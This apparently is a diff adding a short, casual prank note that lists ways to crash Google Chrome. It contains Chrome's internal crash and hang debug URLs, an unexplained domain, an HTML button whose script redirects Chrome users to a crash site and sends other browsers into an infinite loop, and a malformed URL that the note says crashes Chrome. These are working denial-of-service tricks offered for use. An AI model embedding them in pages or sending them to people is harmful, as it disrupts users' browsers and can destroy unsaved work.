@@ -1,0 +1,49 @@
+Im in a rush so ill just list them.
+
+Jzxy.cf
+chrome://badcastcrash
+chrome://inducebrowsercrashforrealz
+chrome://crash
+chrome://crashdump
+chrome://kill
+chrome://hang
+chrome://shorthang
+chrome://gpuclean
+chrome://gpucrash
+chrome://gpuhang
+chrome://memory-exhaust
+chrome://memory-pressure-critical
+chrome://memory-pressure-moderate
+chrome://ppapiflashcrash
+chrome://ppapiflashhang
+chrome://quit
+chrome://restart
+
+I know I said I was over with bookmarks but..
+<button onclick="crash()">???</button>
+    <script type="text/javascript">
+function crash(){
+  if(navigator.userAgent.indexOf("Chrome") != -1 )
+    {
+      alert('WHoops')
+window.open('http://crashchrome.com/', '_self', '');
+    }
+    else {
+      alert('Hehe')
+      while (1==1){
+        console.log(3234567654*45671234567890987654321)
+      }
+    }
+}
+</script>
+
+Very cool!
+http://a/%%30%30
+
+Crashes chrome.
+
+
+
+
+
+
